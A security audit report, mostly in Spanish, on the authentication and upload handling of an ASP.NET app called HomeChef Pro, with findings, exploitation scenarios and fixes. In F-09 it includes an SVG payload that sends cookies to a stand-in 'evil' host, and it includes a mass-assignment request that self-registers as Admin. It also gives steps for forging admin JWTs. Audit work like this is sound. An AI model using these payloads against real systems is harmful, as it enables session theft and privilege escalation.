## 1. Vulnerability summary

High:      7

> **Addendum (2026-05-03, durante remediacion).** Mientras se cerraban F-01/F-02/F-03,
> se identifico **F-21**: el endpoint anonymous `POST /api/auth/register` aceptaba
> el campo `Roles` directamente del body (mass assignment / API3:2023 BOPLA). Cualquiera
> podia auto-registrarse como Admin. Fix: el endpoint ahora ignora `request.Roles` con
> `cmd with { Roles = null }`. 8 tests de integracion que dependian de ese comportamiento
> se refactorizaron para usar el helper `IdentityTestHelpers.RegisterAndAssignRolesAsync`
> que registra via HTTP + promueve via `IIdentityService.AssignRoleAsync` via DI.
> Ver finding F-21 al final de la seccion 3 y test de regresion
> `Register_should_ignore_roles_field_from_body`.

**Resumen ejecutivo.** La fundación de auth de HomeChef Pro está bien diseñada en lo esencial: JWT con HMAC-SHA256, validación estricta de issuer/audience/lifetime/key, refresh tokens de 64 bytes random hasheados con SHA-256, política de longitud mínima de signing key (32 chars), y todos los endpoints admin protegidos con `RequireAuthorization("Admin")` o `("Cashier")`. Sin embargo, hay **3 hallazgos críticos** que bloquean el go-live:

1. `docker-compose.yml` fuerza `ASPNETCORE_ENVIRONMENT: Development`, lo que en cualquier despliegue activa Scalar/OpenAPI público, CORS laxo y filtración de detalle de excepciones.
2. Los archivos servidos por `/uploads/...` se sirven con `UseStaticFiles` directamente sobre el filesystem, sin pasar por la cadena de auth de la API. Esto es exactamente el escenario del modo #6 más peligroso del premortem.
3. `JWT:SigningKey` en `appsettings.json` (committed) es una constante literal conocida; aunque pasa la validación de longitud, si en prod no se sobreescribe por env var, los tokens se firman con un secreto público.

Adicionalmente, faltan capas estándar de hardening: **rate limiting (ausente)**, **security headers (ausentes)**, magic-byte validation en uploads, y MFA en cuentas admin. La auditoría apunta a ASVS 5.0 Level 2; muchos requisitos básicos (V14 Configuration, V13 API, V11 Crypto secret rotation) requieren atención antes del piloto.

## 2. Threat model summary

**Perfiles de atacante considerados.** Anónimo de internet, cliente registrado del chef, admin/cashier comprometido (phishing, password leak), insider con acceso a la BD, atacante de red en wifi del chef (MITM), supply-chain (paquete NuGet comprometido).

**Trust boundaries.** Cliente Flutter ↔ API (`/api/*`); navegador anónimo ↔ static files (`/uploads/*`); webhook de delivery externo ↔ API (`/api/webhooks/delivery/*`); CI/CD ↔ deploy host; BD ↔ API.

**Sensitive assets.** JWT signing key, refresh tokens persistidos (hash), comprobantes de pago (capturas con datos bancarios), credenciales de admin, RIF/cédula, direcciones de delivery, password hashes, connection strings, webhook secrets.

**Top 3 técnicas MITRE ATT&CK aplicables.**
- **T1078 Valid Accounts** — bootstrap admin con password "demo1234" si el operador olvida cambiarla.
- **T1190 Exploit Public-Facing Application** — lectura de comprobantes via `/uploads/<guid>` si el GUID se filtra (logs, respuestas, SQLi).
- **T1110 Brute Force** — login/refresh sin rate limiting permite credential stuffing.

### [CRITICAL] F-01 — `docker-compose.yml` fuerza `ASPNETCORE_ENVIRONMENT: Development`

- **Affected component:** `deploy/docker-compose.yml` (línea con `ASPNETCORE_ENVIRONMENT: Development` en el servicio `api`).
- **Attacker profile:** anónimo de internet.
- **Standard:** OWASP A02:2025 Security Misconfiguration; ASVS V14.3 Configuration Hardening.
- **CWE:** CWE-489 Active Debug Code, CWE-16 Configuration.
- **Description.** El compose de deploy fuerza el entorno a `Development` sin sobrescritura. En `Program.cs` esto activa: (a) `app.MapOpenApi()` y `app.MapScalarApiReference(...)` que exponen documentación interactiva de toda la API en `/openapi/v1.json` y `/scalar/v1`; (b) la rama de CORS que acepta cualquier `localhost`/`127.0.0.1` como origen con `AllowCredentials`; (c) presumiblemente verbosidad de errores en `ExceptionHandlingMiddleware`. Si este compose se reutiliza para staging/producción (escenario probable en el plan de Fase 6), el sistema arranca con todas estas piezas activas frente a internet.
- **Exploitation scenario:**
  1. Atacante visita `https://homechef.app/scalar/v1` o `/openapi/v1.json`.
  2. Obtiene mapa completo de endpoints, payloads esperados, schemas de DTOs.
  3. Identifica endpoints sin rate limit (todos), valida que `/api/auth/login`, `/api/auth/refresh`, `/api/uploads/payment-proofs` son AllowAnonymous.
  4. Cualquier excepción no manejada filtra detalles en respuestas (config development).
- **Impact:** mapa completo de la API entregado al atacante; CORS laxo enables ataques desde cualquier `localhost` (relevante en escenarios mixtos donde el atacante controla un servicio local); error messages verbosos.
- **Recommended fix.**
  - En `deploy/docker-compose.yml`, cambiar a `ASPNETCORE_ENVIRONMENT: ${ASPNETCORE_ENVIRONMENT:-Production}` y leerlo de `deploy/.env`.
  - Para staging: crear `deploy/docker-compose.staging.yml` con `Staging`.
  - Verificar que `app.MapOpenApi()` y `MapScalarApiReference` queden detrás de `if (app.Environment.IsDevelopment())` (ya está) y no se activen accidentalmente con `Staging`.
  - Para entornos pre-prod donde quieres ver la doc, usar `--profile docs` o un `docker-compose.docs.override.yml` que solo cargues a propósito.
- **Effort to fix:** small.
- **Verification:** `curl https://staging.homechef.app/scalar/v1` debe devolver 404. `docker compose -f deploy/docker-compose.yml config | grep ASPNETCORE_ENVIRONMENT` debe leer `Production` o `Staging`.

### [CRITICAL] F-02 — Static files de `/uploads/*` servidos sin autenticación

- **Affected component:** `src/backend/src/HomeChefPro.Api/Program.cs` líneas 65-72 (`app.UseStaticFiles(new StaticFileOptions { ... })`).
- **Attacker profile:** anónimo de internet, cliente registrado.
- **Standard:** OWASP A01:2025 Broken Access Control; OWASP API1:2023 BOLA; ASVS V13.1 (Generic API), V12 File handling.
- **CWE:** CWE-284 Improper Access Control, CWE-548 Information Exposure Through Directory Listing.
- **Description.** El endpoint sirve directamente los archivos del filesystem en `uploads/` con `PhysicalFileProvider` y RequestPath `/uploads`. No pasa por la pipeline de auth (ya configurada con `app.UseAuthentication()` antes), no pasa por nginx con `auth_request`, y no hay verificación de propietario. La única protección actual es que el filename es `Guid.NewGuid("N")` (32 chars hex random, 128 bits — efectivamente no enumerable). Sin embargo:
  - Cualquier filtración del GUID (logs centralizados, respuestas API, lookup en BD) expone el archivo a internet.
  - Una vez listo el refactor multi-tenant, esto es un IDOR cross-tenant directo.
  - El endpoint admite directory traversal si el RequestPath se manipula con `..` (mitigado por `PhysicalFileProvider` pero a verificar).
  - DoS: cualquiera puede hacer requests masivos de GUIDs aleatorios; aun los 404 consumen recursos.
- **Exploitation scenario:**
  1. Cliente A hace pedido → URL retornada a su app: `/uploads/payment-proofs/abc123def...`.
  2. Cliente A reenvía la URL por error / la captura entra en una screenshot / queda en server logs.
  3. Cualquiera con la URL accede al comprobante (datos bancarios visibles).
  4. Para cuando exista multi-tenant: cliente del chef X obtiene URL de comprobante del chef Y, sin nadie validar.
- **Impact:** exposición de datos bancarios de clientes (números de cuenta, banco emisor, montos), brecha frente a SUDEBAN, daño reputacional. Es el modo #6 del premortem.
- **Recommended fix.**
  - **Quitar** el `app.UseStaticFiles({...})` para `/uploads`.
  - **Agregar** un endpoint autenticado `GET /api/uploads/payment-proofs/{filename}` que: (a) verifica autenticación, (b) verifica que el caller es dueño del payment_proof O tiene rol admin/cashier, (c) cuando exista multi-tenant, verifica `tenant_id` match, (d) devuelve el archivo con `Content-Disposition: inline; filename="..."` y `X-Content-Type-Options: nosniff`, `Cache-Control: private, no-store`.
  - Alternativa con nginx: `auth_request /api/auth/check` antes de servir `/uploads/`.
  - Considerar **signed URLs** con expiración corta (5 min) si se necesita servir directo.
- **Effort to fix:** medium.
- **Verification:** test integration `Should_Reject_Anonymous_PaymentProofAccess` que hace `GET /uploads/payment-proofs/<guid>` sin token → 401. Test `Should_Reject_CrossUser_PaymentProofAccess` (usuario A intenta leer proof de usuario B) → 403.

### [CRITICAL] F-03 — `JWT:SigningKey` literal en `appsettings.json` committed

- **Affected component:** `src/backend/src/HomeChefPro.Api/appsettings.json` línea 19 (`"SigningKey": "REEMPLAZAR_EN_PRODUCCION_..."`).
- **Attacker profile:** cualquier persona con acceso de lectura al repo (público o privado pero filtrado).
- **Standard:** OWASP A04:2025 Cryptographic Failures; OWASP A08:2025 Software and Data Integrity Failures; ASVS V14.6 Secrets management.
- **CWE:** CWE-798 Use of Hard-coded Credentials, CWE-321 Use of Hard-coded Cryptographic Key.
- **Description.** El valor por defecto de la signing key es literal `"REEMPLAZAR_EN_PRODUCCION_CON_SECRETO_LARGO_Y_ALEATORIO_DE_AL_MENOS_32_BYTES"` (75 chars, pasa la validación `< 32`). Si el operador olvida sobrescribir vía env var o user-secrets en producción, la API firma todos los JWT con esta clave conocida públicamente, permitiendo a cualquiera forjar tokens de admin.
  - `deploy/.env` SÍ contiene un `JWT_SIGNING_KEY` propio, pero no hay assert en el startup que verifique que la key efectiva ≠ valor de placeholder.
  - El compose actual no monta `appsettings.Production.json`, así que el risk depende 100% de que la env var se inyecte correctamente.
- **Exploitation scenario:**
  1. Atacante examina el repo (público o filtrado por dependency confusion / fuga interna).
  2. Encuentra el placeholder. Verifica si la API en producción acepta tokens firmados con esa key (script: forja JWT con `alg:HS256`, key = placeholder, `role:Admin`, hace request a `/api/admin/orders`).
  3. Si `appsettings.json` ganó sobre env var (por orden de carga mal configurado), o si jacques no inyectó `Jwt__SigningKey` correctamente, el token es válido.
  4. Atacante tiene admin privilegio total.
- **Impact:** compromiso total de la API en cualquier configuración donde la env var no sobrescriba el valor por defecto.
- **Recommended fix.**
  - En `appsettings.json`, dejar `"SigningKey": ""` (string vacía).
  - En `AuthConfiguration.AddAppAuthentication`, fortalecer la validación: rechazar también valores que empiecen con `"REEMPLAZAR"`, `"change-me"`, o que estén vacíos con un mensaje explícito.
  - Mejor: requerir la key SOLO desde env var (`JWT_SIGNING_KEY` → `Jwt__SigningKey` con doble underscore) y no permitir lectura desde `appsettings.json` para esta clave.
  - En CI/CD, agregar un check que falle si `appsettings.json` contiene strings con "REEMPLAZAR" o "change-me".
  - Rotar la key actual en `deploy/.env` por una nueva (`openssl rand -base64 48`) — la key actual ya está expuesta porque pasó por el contexto de esta auditoría, aunque `.env` esté gitignored.
- **Effort to fix:** small.
- **Verification:** test que arranca `WebApplicationFactory` con `Jwt:SigningKey=""` → la app debe fallar startup. Test con `Jwt:SigningKey="REEMPLAZAR_EN_PRODUCCION..."` → también debe fallar.

### [HIGH] F-04 — Rate limiting completamente ausente

- **Affected component:** `src/backend/src/HomeChefPro.Api/Program.cs` y todo el módulo de Endpoints. `grep -rn "AddRateLimiter\|UseRateLimiter\|RequireRateLimiting"` devuelve 0 resultados.
- **Attacker profile:** anónimo, cliente registrado.
- **Standard:** OWASP A07:2025 Identification and Authentication Failures; OWASP API4:2023 Unrestricted Resource Consumption; ASVS V11 Business Logic, V13.4 API.
- **CWE:** CWE-307 Improper Restriction of Excessive Authentication Attempts, CWE-770 Allocation of Resources Without Limits.
- **Description.** No hay `Microsoft.AspNetCore.RateLimiting` configurado. Ni global, ni en endpoints sensibles. Esto deja abierto:
  - Brute force / credential stuffing en `POST /api/auth/login`.
  - Abuse de `POST /api/auth/refresh` sin firma adicional.
  - Spam de `POST /api/auth/register` (cuentas falsas, llenado de BD).
  - DoS en `POST /api/uploads/payment-proofs` (anónimo, hasta 5 MB cada uno).
  - DoS en endpoints anónimos de menú (consumo de DB).
- **Exploitation scenario.**
  1. Atacante hace 10.000 requests/min a `/api/auth/login` con un dictionary de passwords contra `admin@homechef.local`.
  2. Sin lockout, una password de 8 chars del top-1000 cae en horas.
  3. Si la cuenta es la de bootstrap (`demo1234`), cae en segundos.
- **Impact:** account takeover de admin, llenado de storage con archivos basura, DoS.
- **Recommended fix.**
  - Agregar al `Program.cs`:
    ```csharp
    builder.Services.AddRateLimiter(options =>
    {
        options.AddFixedWindowLimiter("auth", o =>
        {
            o.PermitLimit = 10;
            o.Window = TimeSpan.FromMinutes(1);
            o.QueueLimit = 0;
        });
        options.AddFixedWindowLimiter("upload", o =>
        {
            o.PermitLimit = 20;
            o.Window = TimeSpan.FromMinutes(1);
        });
        options.RejectionStatusCode = 429;
    });
    app.UseRateLimiter();
    ```
  - En `AuthEndpoints`: `.RequireRateLimiting("auth")` para login/register/refresh/change-password.
  - En `UploadEndpoints`: `.RequireRateLimiting("upload")`.
  - Considerar lockout temporal por cuenta tras N fallos (Identity tiene `Lockout` configurable).
- **Effort to fix:** small.
- **Verification:** test integration que hace 12 requests rápidos a `/api/auth/login` con password incorrecta → la 11va y 12va devuelven 429.

### [HIGH] F-05 — Security headers ausentes (HSTS, CSP, X-Frame-Options, X-Content-Type-Options)

- **Affected component:** `src/backend/src/HomeChefPro.Api/Program.cs` (no hay `app.UseHsts()`, `app.UseHttpsRedirection()`, ni middleware de security headers); presumiblemente el nginx de `deploy/nginx/` tampoco los configura (a verificar).
- **Attacker profile:** anónimo, atacante MITM.
- **Standard:** OWASP A02:2025 Security Misconfiguration; ASVS V14.4 HTTP Security Headers.
- **CWE:** CWE-693 Protection Mechanism Failure.
- **Description.** No hay middleware que agregue: `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Content-Security-Policy`, `Referrer-Policy: no-referrer`. Tampoco `app.UseHttpsRedirection()`. Si un cliente accede por HTTP, no hay redirect; si por HTTPS, no hay HSTS para futuras conexiones.
- **Exploitation scenario.**
  1. Cliente accede a `http://homechef.app` desde wifi del aeropuerto.
  2. MITM intercepta y sirve una página fake.
  3. Sin HSTS preload, primer-visit downgrade attack pasa.
  4. Sin X-Frame-Options, atacante embebe admin_web en iframe oculto y hace click-jacking en el botón "aprobar pago".
  5. Sin X-Content-Type-Options, archivos subidos con mime spoofing pueden ejecutarse como HTML/JS.
- **Impact:** MITM en cliente final del chef, click-jacking en admin, XSS via uploads.
- **Recommended fix.**
  - Agregar al Program.cs:
    ```csharp
    if (!app.Environment.IsDevelopment())
    {
        app.UseHsts();
        app.UseHttpsRedirection();
    }
    app.Use(async (ctx, next) =>
    {
        ctx.Response.Headers["X-Content-Type-Options"] = "nosniff";
        ctx.Response.Headers["X-Frame-Options"] = "DENY";
        ctx.Response.Headers["Referrer-Policy"] = "no-referrer";
        ctx.Response.Headers["Permissions-Policy"] = "geolocation=(), camera=(), microphone=()";
        // CSP estricto requiere análisis de las apps Flutter; arrancar con report-only.
        await next();
    });
    ```
  - Considerar paquete `NetEscapades.AspNetCore.SecurityHeaders` para CSP/Permissions-Policy más completos.
  - En `deploy/nginx/`: agregar headers también a nivel proxy (defense in depth).
  - HSTS preload (si ya tienen dominio dedicado) tras 6 meses de operación estable.
- **Effort to fix:** small.
- **Verification:** `curl -sI https://staging.homechef.app/health` debe mostrar los 4 headers.

### [HIGH] F-06 — Connection string con password en `appsettings.json` committed

- **Affected component:** `src/backend/src/HomeChefPro.Api/appsettings.json` línea 13 (`"PostgreSQL": "...Password=homechef_dev"`).
- **Attacker profile:** cualquier lector del repo, atacante con LFI/SSRF que lea el JSON.
- **Standard:** OWASP A04:2025 Cryptographic Failures; ASVS V14.6 Secrets in repo.
- **CWE:** CWE-798 Use of Hard-coded Credentials.
- **Description.** Aunque `homechef_dev` es valor de desarrollo, está committed en el repo. Esto: (a) normaliza tener creds en `appsettings.json` y aumenta riesgo de que en algún punto se commitee una password real; (b) si la BD escucha en `localhost:5432` y el atacante consigue port-forwarding (vía un bug separado, p.ej. SSRF), tiene la cred lista; (c) `homechef_dev` es predecible para ataques contra entornos de devs.

  - Vaciar el campo en `appsettings.json`: `"PostgreSQL": ""`.
  - Inyectar siempre desde env var: `ConnectionStrings__PostgreSQL` (doble underscore).
  - En dev, usar User Secrets (`dotnet user-secrets`).
  - Validar al startup que la connection string no esté vacía y no contenga `homechef_dev` literal en ambientes que no sean dev local.
- **Effort to fix:** small.
- **Verification:** `git grep -n "homechef_dev"` en src/ devuelve 0.

### [HIGH] F-07 — Bootstrap admin con password "demo1234" en `deploy/.env`

- **Affected component:** `deploy/.env` (`BOOTSTRAP_ADMIN_PASSWORD=demo1234`).
- **Attacker profile:** anónimo de internet.
- **Standard:** OWASP A07:2025 Auth Failures; ASVS V2.1 Password Security.
- **CWE:** CWE-521 Weak Password Requirements, CWE-1392 Use of Default Credentials.
- **Description.** El bootstrap admin se crea solo si la BD no tiene admin previo, lo que mitiga parcialmente. Sin embargo:
  - El primer arranque crea `admin@homechef.local` con `demo1234`. Si jacques despliega y se va a dormir antes de hacer login y cambiar, hay una ventana donde la cuenta existe con creds conocidas.
  - El comentario dice "cambiar antes de exponer a internet" pero no hay enforcement.
  - Sin rate limiting (F-04), incluso una password decente cae en horas; `demo1234` cae en segundos.
- **Recommended fix.**
  - **Cambiar el approach:** generar password random en el bootstrap y escribirla a un archivo con permisos `0600` (`/var/run/homechef-admin-password`). El operador debe leerla y cambiarla en el primer login (forzar `MustChangePassword = true` en el user creado).
  - O: requerir que `BOOTSTRAP_ADMIN_PASSWORD` cumpla policy mínima (8 chars, mixed case, dígito) y rechazar `demo1234` literal.
  - O: separar la creación del admin del arranque automático y exigir un comando `dotnet run -- create-admin` interactivo.
- **Effort to fix:** medium.
- **Verification:** intentar arrancar con `BOOTSTRAP_ADMIN_PASSWORD=demo1234` en ambiente Production → debe fallar con error de policy.

### [HIGH] F-08 — Webhook secrets vacíos por defecto sin enforcement de "no vacío"

- **Affected component:** `deploy/.env` (`DELIVERY_SECRET_YUMMY=`, `DELIVERY_SECRET_PEDIDOSYA=`, `DELIVERY_SECRET_RAPPI=`); `appsettings.json` `DeliveryWebhooks.Secrets` con strings vacías; `DeliveryWebhookEndpoints.cs` (a confirmar comportamiento cuando secret vacío).
- **Attacker profile:** anónimo de internet.
- **Standard:** OWASP A08:2025 Software and Data Integrity Failures; OWASP API10:2023 Unsafe Consumption of APIs.
- **CWE:** CWE-345 Insufficient Verification of Data Authenticity.
- **Description.** El comentario en `.env` dice "vacíos = no se valida firma (modo dev)". Si `RejectInvalidSignature: true` está en `appsettings.json` pero los secrets están vacíos en prod, dependiendo de la implementación del verifier puede: (a) rechazar todo (mejor caso), (b) aceptar todo cuando el secret es empty (peor caso). Necesita verificación con lectura de `DeliveryWebhookSignatureVerifier.cs`.
- **Exploitation scenario** (caso peor).
  1. Atacante descubre `POST /api/webhooks/delivery/yummy`.
  2. Envía payload forjado: `{ "orderId": "...", "status": "delivered" }` con cualquier signature.
  3. Verifier ve secret vacío → no valida.
  4. Atacante marca orders como entregadas sin que el delivery real haya pasado, o cancela orders maliciosamente.
- **Recommended fix.**
  - En `Program.cs`, validar al startup: si `DeliveryWebhooks.RejectInvalidSignature == true` Y algún secret está vacío, `throw`.
  - O: invertir la lógica — si el secret está vacío, el endpoint del proveedor responde 503 "not configured".
  - Documentar claramente que en prod los 3 secrets son required.
- **Effort to fix:** small.
- **Verification:** test integration que envía request a `/api/webhooks/delivery/yummy` con signature inválida y secret configurado → 401. Con secret vacío y `RejectInvalidSignature=true` → 503.

### [HIGH] F-09 — Upload de comprobantes: solo Content-Type, sin magic bytes ni re-encode

- **Affected component:** `src/backend/src/HomeChefPro.Api/Endpoints/UploadEndpoints.cs`.
- **Attacker profile:** anónimo de internet.
- **Standard:** OWASP A02/A05:2025; ASVS V12 File Resources; OWASP File Upload Cheat Sheet.
- **CWE:** CWE-434 Unrestricted Upload of File with Dangerous Type, CWE-79 XSS.
- **Description.** El endpoint valida `file.ContentType` (header del request) contra una lista blanca (`image/jpeg`, `image/png`, `image/webp`). Esto es trivial de spoofear:
  ```bash
  curl -F "file=@malicious.html;type=image/png" .../api/uploads/payment-proofs
  ```
  El servidor guarda el archivo con extensión derivada del content-type, pero el contenido es HTML/JS/PHP/etc. Nginx luego lo sirve. Si nginx tiene MIME sniffing habilitado o si el archivo se sirve con mime engañoso, ejecuta como HTML/JS en el origen.
  Adicionalmente, no hay verificación de **magic bytes** (los primeros bytes del archivo declaran el formato real) ni **re-encode** (procesar la imagen por una librería como ImageSharp y re-emitirla, lo que destruye payloads embebidos).
  Combinado con F-02 (`/uploads/` servido sin auth y sin nosniff), esto es un vector de XSS stored.
- **Exploitation scenario.**
  1. Atacante sube `<svg onload="fetch('https://evil/?c='+document.cookie)"></svg>` con `Content-Type: image/png`.
  2. Servidor acepta (la lista blanca pasa).
  3. Filename se guarda con extensión `.png` (el endpoint deriva la ext del content-type del request, no del contenido real).
  4. Si en algún momento el archivo se sirve con mime sniffing y el navegador detecta SVG/HTML, ejecuta el script.
  5. Escenarios secundarios: polyglot file que es a la vez JPEG válido y JAR válido; magic-byte-shift attack contra librerías que validan magic bytes con offset fijo.
- **Recommended fix.**
  - Validar **magic bytes** del archivo (los primeros 8-12 bytes) contra la lista de formatos permitidos.
  - **Re-encode** la imagen con `SixLabors.ImageSharp`: leer, decodificar, re-emitir como JPEG/PNG/WEBP. Si decode falla, rechazar. Esto destruye payloads embebidos.
  - **No derivar extensión del Content-Type del request**; derivarla del formato detectado tras el re-encode.
  - Servir archivos con `Content-Type: <real>` + `X-Content-Type-Options: nosniff` + `Content-Disposition: inline; filename="..."`.
  - Considerar servir uploads desde un dominio cookieless (`cdn.homechef.app`) para que un XSS en `/uploads/` no robe cookies del dominio principal.
- **Effort to fix:** medium.
- **Verification:** test integration que sube un archivo con magic bytes de PDF y `Content-Type: image/png` → 400. Test con SVG renombrado a `.png` → 400 tras re-encode.

### [HIGH] F-10 — `POST /api/uploads/payment-proofs` es AllowAnonymous (DoS y abuse)

- **Affected component:** `src/backend/src/HomeChefPro.Api/Endpoints/UploadEndpoints.cs` línea 13 (`.AllowAnonymous()` en el grupo).
- **Attacker profile:** anónimo de internet.
- **Standard:** OWASP A06:2025 Insecure Design; OWASP API4:2023 Unrestricted Resource Consumption.
- **CWE:** CWE-770 Allocation of Resources Without Limits or Throttling.
- **Description.** El endpoint es intencionalmente AllowAnonymous (comentario lo justifica: "guest customer who hasn't logged in"). Aceptable para guests, pero combinado con la ausencia de rate limiting (F-04) y de captcha, se vuelve un vector de:
  - **Storage exhaustion DoS:** anónimo sube 5 MB × N veces → llena el disco del VPS (recordar que en F-05 del premortem operacional, no hay log size limits → disk-full DoS).
  - **Abuse:** archivos no asociados a ninguna order quedan huérfanos sin cleanup.
  - **Coste:** si en algún momento el storage va a S3 / Backblaze, cada upload anónimo es un costo.
- **Recommended fix.**
  - Aplicar rate limit estricto (10/min/IP, 50/hora/IP).
  - Agregar mecanismo de "associate-or-cleanup": si el upload no se asocia a un order_id en N minutos (vía `POST /api/client/orders/{id}/payment`), cron job lo borra.
  - Considerar agregar un challenge ligero (Turnstile/hCaptcha) para uploads anónimos.
  - Limitar el tamaño aún más (¿realmente necesitan 5 MB para una captura de Pago Móvil? 1.5 MB es más que suficiente).
- **Effort to fix:** medium.
- **Verification:** test integration que hace 11 uploads anónimos en 1 min → la 11va devuelve 429.

### [MEDIUM] F-11 — `AccessTokenMinutes = 60` es ventana grande para token comprometido

- **Affected component:** `appsettings.json` `Jwt.AccessTokenMinutes: 60`.
- **Standard:** ASVS V3 Session Management.
- **Description.** Una hora de validez de access token significa que si un token se filtra (logs, browser extension comprometida, XSS en client app), el atacante tiene hasta 60 min de uso autenticado. Estándar moderno: 15 min, con refresh rotation que ya tienen.
- **Recommended fix.** Bajar a 15 min. El refresh con rotación (que ya está) absorbe el costo de UX.
- **Effort to fix:** trivial.

### [MEDIUM] F-12 — `/health/db` filtra counts del negocio (anonymous)

Filtra información del estado del negocio del chef a competidores y atacantes (¿cuántos platos tiene? ¿cuántos ingredientes?). Es información de bajo valor pero debería estar detrás de auth o agregada a un dashboard interno.

### [MEDIUM] F-13 — `AllowedHosts: "*"` permite host header injection

- **Affected component:** `appsettings.json` línea 11.
- **Standard:** OWASP A02:2025; ASVS V14.4.
- **Description.** Un host header arbitrario es aceptado. Vulnerable a "password reset poisoning" (si se agrega esa feature en el futuro: el link del email contendría el dominio del atacante), cache poisoning si hay caching downstream.
- **Recommended fix.** En prod: `"AllowedHosts": "homechef.app;www.homechef.app"`. En dev: dejar `"*"`.

### [MEDIUM] F-14 — CORS `AllowCredentials()` con fallback a `localhost` puede activarse en non-dev

- **Affected component:** `Program.cs` líneas 28-54.
- **Standard:** OWASP A02:2025; ASVS V13 (CORS).
- **Description.** Si `Cors.AllowedOrigins` está vacío AND `Environment.IsDevelopment()`, se usa el callback que acepta cualquier `localhost`. La rama es defensiva, pero el problema es que: (a) si el operador olvida poblar `Cors.AllowedOrigins` en prod, no hay policy específica y los request preflight fallan silenciosamente (UX rota); (b) si por error `ASPNETCORE_ENVIRONMENT=Development` queda en staging/prod (ver F-01), CORS se abre a localhost del atacante.
- **Recommended fix.** Validar al startup en non-dev que `Cors.AllowedOrigins` no esté vacío. Loguear en warning si está vacío.
- **Effort to fix:** small.

### [MEDIUM] F-15 — Posible account enumeration por timing en `/api/auth/login`

- **Affected component:** `LoginUserHandler` y `IIdentityService.VerifyPasswordAsync`.
- **Standard:** OWASP A07:2025; ASVS V2.1 Authentication.
- **CWE:** CWE-208 Information Exposure Through Timing Discrepancy.
- **Description.** El mensaje de respuesta es uniforme ("Invalid email or password"), bien. PERO el flujo: si el email no existe, `VerifyPasswordAsync` retorna falso rápido; si existe, hace bcrypt/PBKDF2 que tarda ~100ms. Diff observable de 80-100ms → un atacante puede enumerar emails registrados.
- **Recommended fix.** En el path "user not found", hacer un dummy hash compute para igualar tiempos:
  ```csharp
  if (user is null) {
      _hasher.HashPassword(null!, "dummy"); // throwaway
      return AuthAttempt.Failed();
  }
  ```
- **Effort to fix:** small.
- **Verification:** test que mide tiempo de 50 logins con user inexistente y 50 con user existente + password incorrecta → diff < 20ms.

### [MEDIUM] F-16 — `POST /api/auth/logout` es AllowAnonymous

- **Affected component:** `AuthEndpoints.cs` líneas 58-67.
- **Standard:** OWASP A07:2025; ASVS V3.2 Session Binding.
- **Description.** Logout requiere el plain refresh token en el body, lo que efectivamente "autentica" al caller (solo el dueño del refresh lo conoce). Sin embargo:
  - Sin auth header, no hay logging del user_id de quien revoca → si alguien filtra refresh tokens y los revoca en masa, no hay registro de quién lo hizo.
  - Vector de DoS: con un dictionary de refresh tokens leaked, un atacante puede invalidar sesiones de muchos usuarios.
- **Recommended fix.** Cambiar a `RequireAuthorization()` y validar que el refresh token enviado pertenece al user del token. Log explícito de revoke con user_id.
- **Effort to fix:** small.

### [MEDIUM] F-17 — No MFA en cuentas Admin/Cashier

- **Affected component:** `AuthConfiguration.cs` (no hay policy `RequireMfa`); falta de endpoint `/api/auth/mfa/*`.
- **Standard:** OWASP A07:2025; ASVS V2.7 Multi-Factor Authentication.
- **Description.** El admin del chef es el único punto de aprobación de pagos y de cambios de stock. Una password comprometida (phishing, leak, brute force F-04) da control total. Sin MFA, no hay capa adicional.

- **Effort to fix:** large (UI en admin_web + backend + flow de enrollment).

### [LOW] F-18 — Sin lockfile de NuGet (`packages.lock.json`)

### [CRITICAL] F-21 — Mass assignment de `Roles` en `POST /api/auth/register` (BOPLA)

- **Affected component:** `src/backend/src/HomeChefPro.Api/Auth/AuthEndpoints.cs` (mapeo de `RegisterUserCommand` desde el body); `src/backend/src/HomeChefPro.Application/Auth/Commands/RegisterUser/RegisterUserCommand.cs` (record con campo `Roles`).
- **Attacker profile:** anónimo de internet.
- **Standard:** OWASP API3:2023 Broken Object Property Level Authorization (BOPLA); ASVS V5.1 Mass Assignment.
- **CWE:** CWE-915 Improperly Controlled Modification of Dynamically-Determined Object Attributes, CWE-269 Improper Privilege Management.
- **Description.** El endpoint `MapPost("/register", [FromBody] RegisterUserCommand cmd, ...)` deserializa el body completo a un record que tiene un campo opcional `IReadOnlyCollection<string>? Roles`. El handler usa esos roles para crear el user en Identity. Como el endpoint es `AllowAnonymous`, **cualquiera puede auto-registrarse con rol Admin** enviando `"roles":["Admin"]` en el body. Es uno de los bugs más serios posibles en un sistema con auth por roles.
- **Exploitation scenario.**
  1. Atacante hace `POST /api/auth/register` con body:
     ```json
     {"email":"a@a.com","password":"Test1234","fullName":"x","roles":["Admin"]}
     ```
  2. La API devuelve 201 con un JWT que incluye claim `role: Admin`.
  3. Atacante usa ese JWT para llamar cualquier endpoint admin (`/api/admin/payments/{id}/verify`, `/api/admin/orders/...`, lectura de comprobantes via F-02 ya cerrado).
- **Impact:** compromiso total de la API. Privilege escalation desde anónimo a Admin en una sola request.
- **Fix implementado.**
  - `AuthEndpoints.cs` ahora hace `var safeCmd = cmd with { Roles = null };` antes de pasar el comando al mediator. El handler asigna `Roles.Client` por default cuando llega null.
  - El record `RegisterUserCommand` mantiene el campo `Roles` para que sigan siendo posibles los flujos administrativos internos (vía MediatR direct, no HTTP), pero los tests ahora pasan por el helper compartido `IdentityTestHelpers.RegisterAndAssignRolesAsync` que registra HTTP + promueve via `IIdentityService.AssignRoleAsync`.
- **Effort to fix:** small (línea de defense en endpoint) + medium (refactor de 8 tests al helper compartido).
- **Verification:** `Register_should_ignore_roles_field_from_body` en `Security/SecurityHardeningTests.cs` registra un user enviando `Roles:[Admin]` y verifica: (a) la respuesta solo lista `Client` en `auth.Roles`; (b) el JWT no funciona contra `/api/admin/ingredients` (403/401).

## 4. Attack chains

### Chain CH-1 — RCE via misconfigured Development env + JWT placeholder

**Goal:** ejecución remota de código en el VPS del chef piloto.

**Pre-conditions:** F-01 (Development env activo en prod) + F-03 (JWT_KEY placeholder no sobrescrito).

**Steps:**
1. Atacante visita `/scalar/v1` (activo por F-01) → obtiene mapa completo de la API.
2. Identifica que hay endpoint `/api/auth/refresh` y los JWT son HS256.
3. Lee el repo público / filtrado, encuentra el placeholder `REEMPLAZAR_EN_PRODUCCION_...` en `appsettings.json`.
4. Forja un JWT con esa key, payload `{ "role": "Admin", "sub": "<random-guid>", ... }`.
5. Si en prod el operador olvidó setear `Jwt__SigningKey` env var, el token es aceptado.
6. Atacante ahora es admin. Llama `/api/admin/orders` y `/api/admin/payments`.
7. Si hay un endpoint admin con upload de archivo y deserialization (a verificar en Pasada B), escala a RCE.

